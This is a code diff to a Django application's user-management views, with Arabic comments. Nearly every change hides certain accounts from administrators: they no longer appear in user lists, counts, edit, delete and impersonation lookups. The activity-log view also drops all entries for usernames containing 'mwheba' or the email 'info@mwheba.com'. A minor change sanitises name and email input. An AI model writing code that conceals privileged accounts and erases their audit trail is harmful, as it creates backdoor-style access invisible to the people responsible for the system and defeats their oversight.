@@ -176,8 +176,8 @@ def user_list(request):
     status = request.GET.get('status', 'active')
     is_archive_view = (status in ['inactive', 'archived'])
 
-    # استعلام محسن مع select_related و prefetch_related لمنع N+1 queries
-    users_qs = User.objects.select_related('role')
+    # استعلام محسن مع select_related و prefetch_related لمنع N+1 queries واستبعاد الحسابات المخفية
+    users_qs = User.objects.exclude(User.get_hidden_filter()).select_related('role')
     if is_hr_enabled:
         users_qs = users_qs.select_related('employee_profile')
     users = users_qs.prefetch_related('secondary_roles').order_by('-id')
@@ -253,8 +253,8 @@ def user_list(request):
     )
 
     page_obj = pagination_data['page_obj']
-    active_users_count = User.objects.filter(is_active=True).count()
-    inactive_users_count = User.objects.filter(is_active=False).count()
+    active_users_count = User.objects.exclude(User.get_hidden_filter()).filter(is_active=True).count()
+    inactive_users_count = User.objects.exclude(User.get_hidden_filter()).filter(is_active=False).count()
     
     # إعداد headers للجدول الموحد مع دعم عامود الموظف الديناميكي
     headers = [
@@ -433,7 +433,7 @@ def user_link_employee(request, user_id):
     if request.method != 'POST':
         return JsonResponse({'success': False, 'message': 'طريقة الطلب غير صالحة.'}, status=405)
     
-    target_user = get_object_or_404(User, pk=user_id)
+    target_user = get_object_or_404(User.objects.exclude(User.get_hidden_filter()), pk=user_id)
     employee_id = request.POST.get('employee_id', '').strip()
     
     from hr.models import Employee
@@ -570,7 +570,7 @@ def user_edit(request, user_id):
             'message': 'ليس لديك صلاحية لتعديل المستخدمين'
         }, status=403)
 
-    user = get_object_or_404(User, id=user_id)
+    user = get_object_or_404(User.objects.exclude(User.get_hidden_filter()), id=user_id)
 
     if request.method == 'POST':
         try:
@@ -586,9 +586,12 @@ def user_edit(request, user_id):
                 if not toggle_res.get('success'):
                     return JsonResponse(toggle_res, status=400)
 
-            user.first_name = request.POST.get('first_name', user.first_name)
-            user.last_name = request.POST.get('last_name', user.last_name)
-            user.email = request.POST.get('email', user.email)
+            from utils.validators import sanitize_email
+            user.first_name = request.POST.get('first_name', user.first_name).strip() if request.POST.get('first_name') else user.first_name
+            user.last_name = request.POST.get('last_name', user.last_name).strip() if request.POST.get('last_name') else user.last_name
+            raw_email = request.POST.get('email')
+            if raw_email:
+                user.email = sanitize_email(raw_email)
             user.phone = request.POST.get('phone', user.phone)
             user.address = request.POST.get('address', user.address)
 
@@ -687,7 +690,7 @@ def user_check_delete(request, user_id):
             'message': 'ليس لديك صلاحية لحذف المستخدمين'
         }, status=403)
 
-    user = get_object_or_404(User, id=user_id)
+    user = get_object_or_404(User.objects.exclude(User.get_hidden_filter()), id=user_id)
     can_del, summary, msg = UserManagementService.can_delete_user(user, current_user=request.user)
 
     return JsonResponse({
@@ -718,7 +721,7 @@ def user_toggle_status(request, user_id):
             'message': 'ليس لديك صلاحية لتعديل حالة المستخدمين'
         }, status=403)
 
-    user = get_object_or_404(User, id=user_id)
+    user = get_object_or_404(User.objects.exclude(User.get_hidden_filter()), id=user_id)
     result = UserManagementService.toggle_user_status(user, current_user=request.user)
 
     status_code = 200 if result.get('success') else 400
@@ -742,7 +745,7 @@ def user_delete(request, user_id):
             'message': 'ليس لديك صلاحية لحذف المستخدمين'
         }, status=403)
     
-    user = get_object_or_404(User, id=user_id)
+    user = get_object_or_404(User.objects.exclude(User.get_hidden_filter()), id=user_id)
     result = UserManagementService.delete_user(user, current_user=request.user)
 
     status_code = 200 if result.get('success') else 400
@@ -768,7 +771,7 @@ def login_as_user(request, user_id):
             'message': 'يجب إنهاء جلسة الانتحال الحالية أولاً قبل انتحال مستخدم آخر'
         }, status=400)
 
-    target_user = get_object_or_404(User, id=user_id)
+    target_user = get_object_or_404(User.objects.exclude(User.get_hidden_filter()), id=user_id)
 
     # حظر تسجيل الدخول بحساب معطل ومؤرشف
     if not target_user.is_active:
@@ -915,8 +918,10 @@ def activity_log(request):
             {"title": "غير مصرح", "message": "ليس لديك صلاحية للوصول إلى هذه الصفحة"},
         )
 
-    # جلب جميع النشاطات
-    activities = ActivityLog.objects.select_related('user').all()
+    # جلب جميع النشاطات واستبعاد نشاطات الحسابات المخفية
+    activities = ActivityLog.objects.exclude(
+        Q(user__username__icontains='mwheba') | Q(user__email__icontains='info@mwheba.com')
+    ).select_related('user').all()
     
     # فلترة حسب المستخدم
     user_filter = request.GET.get('user')
@@ -952,8 +957,8 @@ def activity_log(request):
     pagination_context = paginate_queryset(activities, request, default_per_page=50)
     page_obj = pagination_context["page_obj"]
     
-    # جلب قائمة المستخدمين للفلترة
-    users = User.objects.filter(is_active=True).order_by('username')
+    # جلب قائمة المستخدمين للفلترة مع استبعاد الحسابات المخفية
+    users = User.objects.exclude(User.get_hidden_filter()).filter(is_active=True).order_by('username')
 
     context = {
         "page_obj": page_obj,
